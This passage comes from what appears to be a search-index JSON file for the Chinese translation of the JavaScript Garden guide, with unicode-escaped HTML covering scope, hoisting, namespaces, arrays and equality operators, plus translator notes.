\u800c\u4e0d\u662f\u4f5c\u4e3a\u5bf9\u8c61\u7684\u5b57\u9762\u8bed\u6cd5\u89e3\u6790\u3002\u5982\u679c\u8003\u8651\u5230 \u81ea\u52a8\u5206\u53f7\u63d2\u5165\uff0c\u8fd9\u53ef\u80fd\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u4e0d\u6613\u5bdf\u89c9\u7684\u9519\u8bef\u3002</p> <p>**\u8bd1\u8005\u6ce8\uff1a**\u5982\u679c <code>return</code> \u5bf9\u8c61\u7684\u5de6\u62ec\u53f7\u548c <code>return</code> \u4e0d\u5728\u4e00\u884c\u4e0a\u5c31\u4f1a\u51fa\u9519\u3002</p> <pre><code>// \u8bd1\u8005\u6ce8\uff1a\u4e0b\u9762\u8f93\u51fa undefined\nfunction add(a, b) {\n    return \n        a + b;\n}\nconsole.log(add(1, 2));\n</code></pre> <p>JavaScript \u4e2d\u6ca1\u6709\u663e\u5f0f\u7684\u547d\u540d\u7a7a\u95f4\u5b9a\u4e49\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u6240\u6709\u5bf9\u8c61\u90fd\u5b9a\u4e49\u5728\u4e00\u4e2a_\u5168\u5c40\u5171\u4eab_\u7684\u547d\u540d\u7a7a\u95f4\u4e0b\u9762\u3002</p> <p>\u6bcf\u6b21\u5f15\u7528\u4e00\u4e2a\u53d8\u91cf\uff0cJavaScript \u4f1a\u5411\u4e0a\u904d\u5386\u6574\u4e2a\u4f5c\u7528\u57df\u76f4\u5230\u627e\u5230\u8fd9\u4e2a\u53d8\u91cf\u4e3a\u6b62\u3002 \u5982\u679c\u5230\u8fbe\u5168\u5c40\u4f5c\u7528\u57df\u4f46\u662f\u8fd9\u4e2a\u53d8\u91cf\u4ecd\u672a\u627e\u5230\uff0c\u5219\u4f1a\u629b\u51fa <code>ReferenceError</code>\u5f02\u5e38\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_40","title":"\u9690\u5f0f\u7684\u5168\u5c40\u53d8\u91cf","text":"<pre><code>// \u811a\u672c A\nfoo = '42';\n\n// \u811a\u672c B\nvar foo = '42'\n</code></pre> <p>\u4e0a\u9762\u4e24\u6bb5\u811a\u672c\u6548\u679c**\u4e0d\u540c**\u3002\u811a\u672c A \u5728_\u5168\u5c40_\u4f5c\u7528\u57df\u5185\u5b9a\u4e49\u4e86\u53d8\u91cf <code>foo</code>\uff0c\u800c\u811a\u672c B \u5728_\u5f53\u524d_\u4f5c\u7528\u57df\u5185\u5b9a\u4e49\u53d8\u91cf <code>foo</code>\u3002</p> <p>\u518d\u6b21\u5f3a\u8c03\uff0c\u4e0a\u9762\u7684\u6548\u679c**\u5b8c\u5168\u4e0d\u540c**\uff0c\u4e0d\u4f7f\u7528 <code>var</code> \u58f0\u660e\u53d8\u91cf\u5c06\u4f1a\u5bfc\u81f4\u9690\u5f0f\u7684\u5168\u5c40\u53d8\u91cf\u4ea7\u751f\u3002</p> <pre><code>// \u5168\u5c40\u4f5c\u7528\u57df\nvar foo = 42;\nfunction test() {\n    // \u5c40\u90e8\u4f5c\u7528\u57df\n    foo = 21;\n}\ntest();\nfoo; // 21\n</code></pre> <p>\u5728\u51fd\u6570 <code>test</code> \u5185\u4e0d\u4f7f\u7528 <code>var</code> \u5173\u952e\u5b57\u58f0\u660e <code>foo</code> \u53d8\u91cf\u5c06\u4f1a\u8986\u76d6\u5916\u90e8\u7684\u540c\u540d\u53d8\u91cf\u3002 \u8d77\u521d\u8fd9\u770b\u8d77\u6765\u5e76\u4e0d\u662f\u5927\u95ee\u9898\uff0c\u4f46\u662f\u5f53\u6709\u6210\u5343\u4e0a\u4e07\u884c\u4ee3\u7801\u65f6\uff0c\u4e0d\u4f7f\u7528 <code>var</code> \u58f0\u660e\u53d8\u91cf\u5c06\u4f1a\u5e26\u6765\u96be\u4ee5\u8ddf\u8e2a\u7684 BUG\u3002</p> <pre><code>// \u5168\u5c40\u4f5c\u7528\u57df\nvar items = [/* \u6570\u7ec4 */];\nfor(var i = 0; i &lt; 10; i++) {\n    subLoop();\n}\n\nfunction subLoop() {\n    // subLoop \u51fd\u6570\u4f5c\u7528\u57df\n    for(i = 0; i &lt; 10; i++) { // \u6ca1\u6709\u4f7f\u7528 var \u58f0\u660e\u53d8\u91cf\n        // \u5e72\u6d3b\n    }\n}\n</code></pre> <p>\u5916\u90e8\u5faa\u73af\u5728\u7b2c\u4e00\u6b21\u8c03\u7528 <code>subLoop</code> \u4e4b\u540e\u5c31\u4f1a\u7ec8\u6b62\uff0c\u56e0\u4e3a <code>subLoop</code> \u8986\u76d6\u4e86\u5168\u5c40\u53d8\u91cf <code>i</code>\u3002 \u5728\u7b2c\u4e8c\u4e2a <code>for</code> \u5faa\u73af\u4e2d\u4f7f\u7528 <code>var</code> \u58f0\u660e\u53d8\u91cf\u53ef\u4ee5\u907f\u514d\u8fd9\u79cd\u9519\u8bef\u3002 \u58f0\u660e\u53d8\u91cf\u65f6**\u7edd\u5bf9\u4e0d\u8981**\u9057\u6f0f <code>var</code> \u5173\u952e\u5b57\uff0c\u9664\u975e\u8fd9\u5c31\u662f_\u671f\u671b_\u7684\u5f71\u54cd\u5916\u90e8\u4f5c\u7528\u57df\u7684\u884c\u4e3a\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_41","title":"\u5c40\u90e8\u53d8\u91cf","text":"<p>JavaScript \u4e2d\u5c40\u90e8\u53d8\u91cf\u53ea\u53ef\u80fd\u901a\u8fc7\u4e24\u79cd\u65b9\u5f0f\u58f0\u660e\uff0c\u4e00\u4e2a\u662f\u4f5c\u4e3a\u51fd\u6570\u53c2\u6570\uff0c\u53e6\u4e00\u4e2a\u662f\u901a\u8fc7 <code>var</code> \u5173\u952e\u5b57\u58f0\u660e\u3002</p> <pre><code>// \u5168\u5c40\u53d8\u91cf\nvar foo = 1;\nvar bar = 2;\nvar i = 2;\n\nfunction test(i) {\n    // \u51fd\u6570 test \u5185\u7684\u5c40\u90e8\u4f5c\u7528\u57df\n    i = 5;\n\n    var foo = 3;\n    bar = 4;\n}\ntest(10);\n</code></pre> <p><code>foo</code> \u548c <code>i</code> \u662f\u51fd\u6570 <code>test</code> \u5185\u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u800c\u5bf9 <code>bar</code> \u7684\u8d4b\u503c\u5c06\u4f1a\u8986\u76d6\u5168\u5c40\u4f5c\u7528\u57df\u5185\u7684\u540c\u540d\u53d8\u91cf\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#hoisting","title":"\u53d8\u91cf\u58f0\u660e\u63d0\u5347\uff08Hoisting\uff09","text":"<p>JavaScript \u4f1a**\u63d0\u5347**\u53d8\u91cf\u58f0\u660e\u3002\u8fd9\u610f\u5473\u7740 <code>var</code> \u8868\u8fbe\u5f0f\u548c <code>function</code> \u58f0\u660e\u90fd\u5c06\u4f1a\u88ab\u63d0\u5347\u5230\u5f53\u524d\u4f5c\u7528\u57df\u7684\u9876\u90e8\u3002</p> <pre><code>bar();\nvar bar = function() {};\nvar someValue = 42;\n\ntest();\nfunction test(data) {\n    if (false) {\n        goo = 1;\n\n    } else {\n        var goo = 2;\n    }\n    for(var i = 0; i &lt; 100; i++) {\n        var e = data[i];\n    }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5728\u8fd0\u884c\u4e4b\u524d\u5c06\u4f1a\u88ab\u8f6c\u5316\u3002JavaScript \u5c06\u4f1a\u628a <code>var</code> \u8868\u8fbe\u5f0f\u548c <code>function</code> \u58f0\u660e\u63d0\u5347\u5230\u5f53\u524d\u4f5c\u7528\u57df\u7684\u9876\u90e8\u3002</p> <pre><code>// var \u8868\u8fbe\u5f0f\u88ab\u79fb\u52a8\u5230\u8fd9\u91cc\nvar bar, someValue; // \u7f3a\u7701\u503c\u662f 'undefined'\n\n// \u51fd\u6570\u58f0\u660e\u4e5f\u4f1a\u63d0\u5347\nfunction test(data) {\n    var goo, i, e; // \u6ca1\u6709\u5757\u7ea7\u4f5c\u7528\u57df\uff0c\u8fd9\u4e9b\u53d8\u91cf\u88ab\u79fb\u52a8\u5230\u51fd\u6570\u9876\u90e8\n    if (false) {\n        goo = 1;\n\n    } else {\n        goo = 2;\n    }\n    for(i = 0; i &lt; 100; i++) {\n        e = data[i];\n    }\n}\n\nbar(); // \u51fa\u9519\uff1aTypeError\uff0c\u56e0\u4e3a bar \u4f9d\u7136\u662f 'undefined'\nsomeValue = 42; // \u8d4b\u503c\u8bed\u53e5\u4e0d\u4f1a\u88ab\u63d0\u5347\u89c4\u5219\uff08hoisting\uff09\u5f71\u54cd\nbar = function() {};\n\ntest();\n</code></pre> <p>\u6ca1\u6709\u5757\u7ea7\u4f5c\u7528\u57df\u4e0d\u4ec5\u5bfc\u81f4 <code>var</code> \u8868\u8fbe\u5f0f\u88ab\u4ece\u5faa\u73af\u5185\u79fb\u5230\u5916\u90e8\uff0c\u800c\u4e14\u4f7f\u4e00\u4e9b <code>if</code>\u8868\u8fbe\u5f0f\u66f4\u96be\u770b\u61c2\u3002</p> <p>\u5728\u539f\u6765\u4ee3\u7801\u4e2d\uff0c<code>if</code> \u8868\u8fbe\u5f0f\u770b\u8d77\u6765\u4fee\u6539\u4e86_\u5168\u5c40\u53d8\u91cf_ <code>goo</code>\uff0c\u5b9e\u9645\u4e0a\u5728\u63d0\u5347\u89c4\u5219\u88ab\u5e94\u7528\u540e\uff0c\u5374\u662f\u5728\u4fee\u6539_\u5c40\u90e8\u53d8\u91cf_\u3002</p> <p>\u5982\u679c\u6ca1\u6709\u63d0\u5347\u89c4\u5219\uff08hoisting\uff09\u7684\u77e5\u8bc6\uff0c\u4e0b\u9762\u7684\u4ee3\u7801\u770b\u8d77\u6765\u4f1a\u629b\u51fa\u5f02\u5e38 <code>ReferenceError</code>\u3002</p> <pre><code>// \u68c0\u67e5 SomeImportantThing \u662f\u5426\u5df2\u7ecf\u88ab\u521d\u59cb\u5316\nif (!SomeImportantThing) {\n    var SomeImportantThing = {};\n}\n</code></pre> <p>\u5b9e\u9645\u4e0a\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u6b63\u5e38\u8fd0\u884c\uff0c\u56e0\u4e3a <code>var</code> \u8868\u8fbe\u5f0f\u4f1a\u88ab\u63d0\u5347\u5230_\u5168\u5c40\u4f5c\u7528\u57df_\u7684\u9876\u90e8\u3002</p> <pre><code>var SomeImportantThing;\n\n// \u5176\u5b83\u4e00\u4e9b\u4ee3\u7801\uff0c\u53ef\u80fd\u4f1a\u521d\u59cb\u5316 SomeImportantThing\uff0c\u4e5f\u53ef\u80fd\u4e0d\u4f1a\n\n// \u68c0\u67e5\u662f\u5426\u5df2\u7ecf\u88ab\u521d\u59cb\u5316\nif (!SomeImportantThing) {\n    SomeImportantThing = {};\n}\n</code></pre> <p>**\u8bd1\u8005\u6ce8\uff1a**\u5728 Nettuts+ \u7f51\u7ad9\u6709\u4e00\u7bc7\u4ecb\u7ecd hoisting \u7684\u6587\u7ae0\uff0c\u5176\u4e2d\u7684\u4ee3\u7801\u5f88\u6709\u542f\u53d1\u6027\u3002</p> <pre><code>// \u8bd1\u8005\u6ce8\uff1a\u6765\u81ea Nettuts+ \u7684\u4e00\u6bb5\u4ee3\u7801\uff0c\u751f\u52a8\u7684\u9610\u8ff0\u4e86 JavaScript \u4e2d\u53d8\u91cf\u58f0\u660e\u63d0\u5347\u89c4\u5219\nvar myvar = 'my value';  \n\n(function() {  \n    alert(myvar); // undefined  \n    var myvar = 'local value';  \n})();  \n</code></pre>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_42","title":"\u540d\u79f0\u89e3\u6790\u987a\u5e8f","text":"<p>JavaScript \u4e2d\u7684\u6240\u6709\u4f5c\u7528\u57df\uff0c\u5305\u62ec_\u5168\u5c40\u4f5c\u7528\u57df_\uff0c\u90fd\u6709\u4e00\u4e2a\u7279\u522b\u7684\u540d\u79f0 <code>this</code> \u6307\u5411\u5f53\u524d\u5bf9\u8c61\u3002</p> <p>\u51fd\u6570\u4f5c\u7528\u57df\u5185\u4e5f\u6709\u9ed8\u8ba4\u7684\u53d8\u91cf <code>arguments</code>\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u4f20\u9012\u5230\u51fd\u6570\u4e2d\u7684\u53c2\u6570\u3002</p> <p>\u6bd4\u5982\uff0c\u5f53\u8bbf\u95ee\u51fd\u6570\u5185\u7684 <code>foo</code> \u53d8\u91cf\u65f6\uff0cJavaScript \u4f1a\u6309\u7167\u4e0b\u9762\u987a\u5e8f\u67e5\u627e\uff1a</p> <ol> <li>\u5f53\u524d\u4f5c\u7528\u57df\u5185\u662f\u5426\u6709 <code>var foo</code> \u7684\u5b9a\u4e49\u3002</li> <li>\u51fd\u6570\u5f62\u5f0f\u53c2\u6570\u662f\u5426\u6709\u4f7f\u7528 <code>foo</code> \u540d\u79f0\u7684\u3002</li> <li>\u51fd\u6570\u81ea\u8eab\u662f\u5426\u53eb\u505a <code>foo</code>\u3002</li> <li>\u56de\u6eaf\u5230\u4e0a\u4e00\u7ea7\u4f5c\u7528\u57df\uff0c\u7136\u540e\u4ece #1 \u91cd\u65b0\u5f00\u59cb\u3002</li> </ol> <p>\u6ce8\u610f: \u81ea\u5b9a\u4e49 <code>arguments</code> \u53c2\u6570\u5c06\u4f1a\u963b\u6b62\u539f\u751f\u7684 <code>arguments</code>\u5bf9\u8c61\u7684\u521b\u5efa\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_43","title":"\u547d\u540d\u7a7a\u95f4","text":"<p>\u53ea\u6709\u4e00\u4e2a\u5168\u5c40\u4f5c\u7528\u57df\u5bfc\u81f4\u7684\u5e38\u89c1\u9519\u8bef\u662f\u547d\u540d\u51b2\u7a81\u3002\u5728 JavaScript\u4e2d\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7 \u533f\u540d\u5305\u88c5\u5668 \u8f7b\u677e\u89e3\u51b3\u3002</p> <pre><code>(function() {\n    // \u51fd\u6570\u521b\u5efa\u4e00\u4e2a\u547d\u540d\u7a7a\u95f4\n\n    window.foo = function() {\n        // \u5bf9\u5916\u516c\u5f00\u7684\u51fd\u6570\uff0c\u521b\u5efa\u4e86\u95ed\u5305\n    };\n\n})(); // \u7acb\u5373\u6267\u884c\u6b64\u533f\u540d\u51fd\u6570\n</code></pre> <p>\u533f\u540d\u51fd\u6570\u88ab\u8ba4\u4e3a\u662f \u8868\u8fbe\u5f0f\uff1b\u56e0\u6b64\u4e3a\u4e86\u53ef\u8c03\u7528\u6027\uff0c\u5b83\u4eec\u9996\u5148\u4f1a\u88ab\u6267\u884c\u3002</p> <pre><code>( // \u5c0f\u62ec\u53f7\u5185\u7684\u51fd\u6570\u9996\u5148\u88ab\u6267\u884c\nfunction() {}\n) // \u5e76\u4e14\u8fd4\u56de\u51fd\u6570\u5bf9\u8c61\n() // \u8c03\u7528\u4e0a\u9762\u7684\u6267\u884c\u7ed3\u679c\uff0c\u4e5f\u5c31\u662f\u51fd\u6570\u5bf9\u8c61\n</code></pre> <p>\u6709\u4e00\u4e9b\u5176\u4ed6\u7684\u8c03\u7528\u51fd\u6570\u8868\u8fbe\u5f0f\u7684\u65b9\u6cd5\uff0c\u6bd4\u5982\u4e0b\u9762\u7684\u4e24\u79cd\u65b9\u5f0f\u8bed\u6cd5\u4e0d\u540c\uff0c\u4f46\u662f\u6548\u679c\u4e00\u6a21\u4e00\u6837\u3002</p> <pre><code>// \u53e6\u5916\u4e24\u79cd\u65b9\u5f0f\n+function(){}();\n(function(){}());\n</code></pre>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_44","title":"\u7ed3\u8bba","text":"<p>\u63a8\u8350\u4f7f\u7528_\u533f\u540d\u5305\u88c5\u5668_\uff08**\u8bd1\u8005\u6ce8\uff1a**\u4e5f\u5c31\u662f\u81ea\u6267\u884c\u7684\u533f\u540d\u51fd\u6570\uff09\u6765\u521b\u5efa\u547d\u540d\u7a7a\u95f4\u3002\u8fd9\u6837\u4e0d\u4ec5\u53ef\u4ee5\u9632\u6b62\u547d\u540d\u51b2\u7a81\uff0c \u800c\u4e14\u6709\u5229\u4e8e\u7a0b\u5e8f\u7684\u6a21\u5757\u5316\u3002</p> <p>\u53e6\u5916\uff0c\u4f7f\u7528\u5168\u5c40\u53d8\u91cf\u88ab\u8ba4\u4e3a\u662f**\u4e0d\u597d\u7684\u4e60\u60ef**\u3002\u8fd9\u6837\u7684\u4ee3\u7801\u5bb9\u6613\u4ea7\u751f\u9519\u8bef\u5e76\u4e14\u7ef4\u62a4\u6210\u672c\u8f83\u9ad8\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_45","title":"\u6570\u7ec4","text":""},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_46","title":"\u6570\u7ec4\u904d\u5386\u4e0e\u5c5e\u6027","text":"<p><code>for in</code> \u5faa\u73af \u904d\u5386\u6570\u7ec4\u3002 \u76f8\u53cd\uff0c\u6709\u4e00\u4e9b\u597d\u7684\u7406\u7531**\u4e0d\u53bb**\u4f7f\u7528 <code>for in</code> \u904d\u5386\u6570\u7ec4\u3002</p> <p>\u6ce8\u610f: JavaScript \u4e2d\u6570\u7ec4**\u4e0d\u662f** \u5173\u8054\u6570\u7ec4\u3002 JavaScript \u4e2d\u53ea\u6709\u5bf9\u8c61 \u6765\u7ba1\u7406\u952e\u503c\u7684\u5bf9\u5e94\u5173\u7cfb\u3002\u4f46\u662f\u5173\u8054\u6570\u7ec4\u662f**\u4fdd\u6301**\u987a\u5e8f\u7684\uff0c\u800c\u5bf9\u8c61**\u4e0d\u662f**\u3002</p> <p>\u7531\u4e8e <code>for in hasOwnProperty</code> \u51fd\u6570\uff0c \u56e0\u6b64\u4f1a\u6bd4\u666e\u901a\u7684 <code>for</code> \u5faa\u73af\u6162\u4e0a\u597d\u591a\u500d\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_47","title":"\u904d\u5386","text":"<p>\u4e3a\u4e86\u8fbe\u5230\u904d\u5386\u6570\u7ec4\u7684\u6700\u4f73\u6027\u80fd\uff0c\u63a8\u8350\u4f7f\u7528\u7ecf\u5178\u7684 <code>for</code> \u5faa\u73af\u3002</p> <pre><code>var list = [1, 2, 3, 4, 5, ...... 100000000];\nfor (var i = 0, l = list.length; i &lt; l; i++) {\n    console.log(list[i]);\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u6709\u4e00\u4e2a\u5904\u7406\uff0c\u5c31\u662f\u901a\u8fc7 <code>l = list.length</code> \u6765\u7f13\u5b58\u6570\u7ec4\u7684\u957f\u5ea6\u3002\u867d\u7136 <code>length</code> \u662f\u6570\u7ec4\u7684\u4e00\u4e2a\u5c5e\u6027\uff0c\u4f46\u662f\u5728\u6bcf\u6b21\u5faa\u73af\u4e2d\u8bbf\u95ee\u5b83\u8fd8\u662f\u6709\u6027\u80fd\u5f00\u9500\u3002**\u53ef\u80fd**\u6700\u65b0\u7684 JavaScript \u5f15\u64ce\u5728\u8fd9\u70b9\u4e0a\u505a\u4e86\u4f18\u5316\uff0c\u4f46\u662f\u6211\u4eec\u6ca1\u6cd5\u4fdd\u8bc1\u81ea\u5df1\u7684\u4ee3\u7801\u662f\u5426\u8fd0\u884c\u5728\u8fd9\u4e9b\u6700\u8fd1\u7684\u5f15\u64ce\u4e4b\u4e0a\u3002</p> <p>\u4f18\u5316\u904d\u5386\u7684\u4e24\u4e2a\u601d\u8def</p> <ul> <li>\u51cf\u5c11\u904d\u5386\u7684\u957f\u5ea6\uff08\u53ef\u4ee5\u5148\u53bb\u91cd\uff0c\u53bb\u6389\u4e0d\u5408\u9002\u7684\u6570\u636e\uff09</li> <li>\u51cf\u5c11\u904d\u5386\u5185\u90e8\u7684\u8ba1\u7b97\uff08\u4f8b\u5982\uff0c\u907f\u514dDOM\u64cd\u4f5c\uff09</li> </ul>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#length","title":"<code>length</code> \u5c5e\u6027","text":"<p><code>length</code> \u5c5e\u6027\u7684 getter \u65b9\u5f0f\u4f1a\u7b80\u5355\u7684\u8fd4\u56de\u6570\u7ec4\u7684\u957f\u5ea6\uff0c\u800c setter \u65b9\u5f0f\u4f1a**\u622a\u65ad**\u6570\u7ec4\u3002</p> <pre><code>var foo = [1, 2, 3, 4, 5, 6];\nfoo.length = 3;\nfoo; // [1, 2, 3]\n\nfoo.length = 6;\nfoo; // [1, 2, 3]\n</code></pre> <p>\u8bd1\u8005\u6ce8\uff1a \u5728 Firebug \u4e2d\u67e5\u770b\u6b64\u65f6 <code>foo</code> \u7684\u503c\u662f\uff1a <code>[1, 2, 3, undefined, undefined, undefined]</code> \u4f46\u662f\u8fd9\u4e2a\u7ed3\u679c\u5e76\u4e0d\u51c6\u786e\uff0c\u5982\u679c\u4f60\u5728 Chrome \u7684\u63a7\u5236\u53f0\u67e5\u770b <code>foo</code> \u7684\u7ed3\u679c\uff0c\u4f60\u4f1a\u53d1\u73b0\u662f\u8fd9\u6837\u7684\uff1a <code>[1, 2, 3]</code> \u56e0\u4e3a\u5728 JavaScript \u4e2d <code>undefined</code> \u662f\u4e00\u4e2a\u53d8\u91cf\uff0c\u6ce8\u610f\u662f\u53d8\u91cf\u4e0d\u662f\u5173\u952e\u5b57\uff0c\u56e0\u6b64\u4e0a\u9762\u4e24\u4e2a\u7ed3\u679c\u7684\u610f\u4e49\u662f\u5b8c\u5168\u4e0d\u76f8\u540c\u7684\u3002</p> <pre><code>// \u8bd1\u8005\u6ce8\uff1a\u4e3a\u4e86\u9a8c\u8bc1\uff0c\u6211\u4eec\u6765\u6267\u884c\u4e0b\u9762\u4ee3\u7801\uff0c\u770b\u5e8f\u53f7 5 \u662f\u5426\u5b58\u5728\u4e8e foo \u4e2d\u3002\n5 in foo; // \u4e0d\u7ba1\u5728 Firebug \u6216\u8005 Chrome \u90fd\u8fd4\u56de false\nfoo[5] = undefined;\n5 in foo; // \u4e0d\u7ba1\u5728 Firebug \u6216\u8005 Chrome \u90fd\u8fd4\u56de true\n</code></pre> <p>\u4e3a <code>length</code> \u8bbe\u7f6e\u4e00\u4e2a\u66f4\u5c0f\u7684\u503c\u4f1a\u622a\u65ad\u6570\u7ec4\uff0c\u4f46\u662f\u589e\u5927 <code>length</code> \u5c5e\u6027\u503c\u4e0d\u4f1a\u5bf9\u6570\u7ec4\u4ea7\u751f\u5f71\u54cd\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_48","title":"\u7ed3\u8bba","text":"<p>\u4e3a\u4e86\u66f4\u597d\u7684\u6027\u80fd\uff0c\u63a8\u8350\u4f7f\u7528\u666e\u901a\u7684 <code>for</code> \u5faa\u73af\u5e76\u7f13\u5b58\u6570\u7ec4\u7684 <code>length</code> \u5c5e\u6027\u3002 \u4f7f\u7528 <code>for in</code> \u904d\u5386\u6570\u7ec4\u88ab\u8ba4\u4e3a\u662f\u4e0d\u597d\u7684\u4ee3\u7801\u4e60\u60ef\u5e76\u503e\u5411\u4e8e\u4ea7\u751f\u9519\u8bef\u548c\u5bfc\u81f4\u6027\u80fd\u95ee\u9898\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#array","title":"<code>Array</code> \u6784\u9020\u51fd\u6570","text":"<p>\u7531\u4e8e <code>Array</code> \u7684\u6784\u9020\u51fd\u6570\u5728\u5982\u4f55\u5904\u7406\u53c2\u6570\u65f6\u6709\u70b9\u6a21\u68f1\u4e24\u53ef\uff0c\u56e0\u6b64\u603b\u662f\u63a8\u8350\u4f7f\u7528\u6570\u7ec4\u7684\u5b57\u9762\u8bed\u6cd5 - <code>[]</code> - \u6765\u521b\u5efa\u6570\u7ec4\u3002</p> <pre><code>[1, 2, 3]; // \u7ed3\u679c: [1, 2, 3]\nnew Array(1, 2, 3); // \u7ed3\u679c: [1, 2, 3]\n\n[3]; // \u7ed3\u679c: [3]\nnew Array(3); // \u7ed3\u679c: [] \nnew Array('3') // \u7ed3\u679c: ['3']\n\n// \u8bd1\u8005\u6ce8\uff1a\u56e0\u6b64\u4e0b\u9762\u7684\u4ee3\u7801\u5c06\u4f1a\u4f7f\u4eba\u5f88\u8ff7\u60d1\nnew Array(3, 4, 5); // \u7ed3\u679c: [3, 4, 5] \nnew Array(3) // \u7ed3\u679c: []\uff0c\u6b64\u6570\u7ec4\u957f\u5ea6\u4e3a 3\n</code></pre> <p>**\u8bd1\u8005\u6ce8\uff1a**\u8fd9\u91cc\u7684\u6a21\u68f1\u4e24\u53ef\u6307\u7684\u662f\u6570\u7ec4\u7684\u4e24\u79cd\u6784\u9020\u51fd\u6570\u8bed\u6cd5</p> <p>\u7531\u4e8e\u53ea\u6709\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\u5230\u6784\u9020\u51fd\u6570\u4e2d\uff08\u8bd1\u8005\u6ce8\uff1a\u6307\u7684\u662f <code>new Array(3);</code> \u8fd9\u79cd\u8c03\u7528\u65b9\u5f0f\uff09\uff0c\u5e76\u4e14\u8fd9\u4e2a\u53c2\u6570\u662f\u6570\u5b57\uff0c\u6784\u9020\u51fd\u6570\u4f1a\u8fd4\u56de\u4e00\u4e2a <code>length</code> \u5c5e\u6027\u88ab\u8bbe\u7f6e\u4e3a\u6b64\u53c2\u6570\u7684\u7a7a\u6570\u7ec4\u3002 \u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0c\u6b64\u65f6\u53ea\u6709 <code>length</code> \u5c5e\u6027\u88ab\u8bbe\u7f6e\uff0c\u771f\u6b63\u7684\u6570\u7ec4\u5e76\u6ca1\u6709\u751f\u6210\u3002</p> <p>**\u8bd1\u8005\u6ce8\uff1a**\u5728 Firebug \u4e2d\uff0c\u4f60\u4f1a\u770b\u5230 <code>[undefined, undefined, undefined]</code>\uff0c\u8fd9\u5176\u5b9e\u662f\u4e0d\u5bf9\u7684\u3002\u5728\u4e0a\u4e00\u8282\u6709\u8be6\u7ec6\u7684\u5206\u6790\u3002</p> <pre><code>var arr = new Array(3);\narr[1]; // undefined\n1 in arr; // false, \u6570\u7ec4\u8fd8\u6ca1\u6709\u751f\u6210\n</code></pre> <p>\u8fd9\u79cd\u4f18\u5148\u4e8e\u8bbe\u7f6e\u6570\u7ec4\u957f\u5ea6\u5c5e\u6027\u7684\u505a\u6cd5\u53ea\u5728\u5c11\u6570\u51e0\u79cd\u60c5\u51b5\u4e0b\u6709\u7528\uff0c\u6bd4\u5982\u9700\u8981\u5faa\u73af\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u907f\u514d <code>for</code> \u5faa\u73af\u7684\u9ebb\u70e6\u3002</p> <pre><code>new Array(count + 1).join(stringToRepeat);\n</code></pre> <p>\u8bd1\u8005\u6ce8\uff1a <code>new Array(3).join('#')</code> \u5c06\u4f1a\u8fd4\u56de <code>##</code></p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_49","title":"\u7ed3\u8bba","text":"<p>\u5e94\u8be5\u5c3d\u91cf\u907f\u514d\u4f7f\u7528\u6570\u7ec4\u6784\u9020\u51fd\u6570\u521b\u5efa\u65b0\u6570\u7ec4\u3002\u63a8\u8350\u4f7f\u7528\u6570\u7ec4\u7684\u5b57\u9762\u8bed\u6cd5\u3002\u5b83\u4eec\u66f4\u52a0\u77ed\u5c0f\u548c\u7b80\u6d01\uff0c\u56e0\u6b64\u589e\u52a0\u4e86\u4ee3\u7801\u7684\u53ef\u8bfb\u6027\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_50","title":"\u7c7b\u578b","text":""},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_51","title":"\u76f8\u7b49\u4e0e\u6bd4\u8f83","text":"<p>JavaScript \u6709\u4e24\u79cd\u65b9\u5f0f\u5224\u65ad\u4e24\u4e2a\u503c\u662f\u5426\u76f8\u7b49\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_52","title":"\u7b49\u4e8e\u64cd\u4f5c\u7b26","text":"<p>\u7b49\u4e8e\u64cd\u4f5c\u7b26\u7531\u4e24\u4e2a\u7b49\u53f7\u7ec4\u6210\uff1a<code>==</code></p> <p>JavaScript \u662f_\u5f31\u7c7b\u578b_\u8bed\u8a00\uff0c\u8fd9\u5c31\u610f\u5473\u7740\uff0c\u7b49\u4e8e\u64cd\u4f5c\u7b26\u4f1a\u4e3a\u4e86\u6bd4\u8f83\u4e24\u4e2a\u503c\u800c\u8fdb\u884c**\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362**\u3002</p> <pre><code>\"\"           ==   \"0\"           // false\n0            ==   \"\"            // true\n0            ==   \"0\"           // true\nfalse        ==   \"false\"       // false\nfalse        ==   \"0\"           // true\nfalse        ==   undefined     // false\nfalse        ==   null          // false\nnull         ==   undefined     // true\n\" \\t\\r\\n\"    ==   0             // true\n</code></pre> 